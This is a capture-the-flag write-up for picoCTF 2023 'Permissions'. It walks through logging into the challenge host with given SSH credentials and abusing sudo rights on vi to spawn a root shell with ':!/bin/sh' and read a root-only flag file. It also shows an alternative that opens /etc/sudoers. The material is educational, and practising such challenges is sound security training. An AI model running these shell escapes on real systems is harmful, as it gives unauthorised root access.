Permissions – picoCTF 2023 Writeup

Challenge Type
General Skills (Privilege Escalation)

⸻

Objective

Gain access to a restricted flag file located at:

/root/.flag.txt

The user does not have direct permission, so the goal is to escalate privileges.

⸻

Step 1: Connect to the Target

Use SSH with the provided credentials:

ssh -p 56986 picoplayer@saturn.picoctf.net

Password:

vCR2tuwCRm


⸻

Step 2: Check Sudo Permissions

Run:

sudo -l

Output reveals:
	•	The user can run /usr/bin/vi as root
	•	No other sudo privileges are allowed

⸻

Step 3: Identify Exploitation Path

vi is a powerful text editor that allows shell execution.
This can be abused to spawn a root shell.

⸻

Step 4: Exploit vi to Get Root Shell

Run:

sudo /usr/bin/vi

Inside vi:
	1.	Press Esc
	2.	Execute:

:!/bin/sh

This spawns a root shell.

⸻

Step 5: Access the Flag

Now that you have root privileges:

cd /root
ls -a
cat .flag.txt


⸻

Step 6: Retrieve the Flag

Example format:

picoCTF{<flag_contents>}


⸻

Alternative Method

You can also open a file with root privileges:

sudo vi /etc/sudoers

Then execute:

:!sh

This achieves the same privilege escalation.

⸻

Key Concepts Learned
	•	Misconfigured sudo permissions can lead to privilege escalation
	•	Programs like vi allow shell escape
	•	Always check allowed binaries using sudo -l
	•	Editors are common vectors in privilege escalation (GTFOBins concept)

⸻

Summary

The challenge relies on abusing allowed sudo access to vi to escape into a root shell and read a protected file.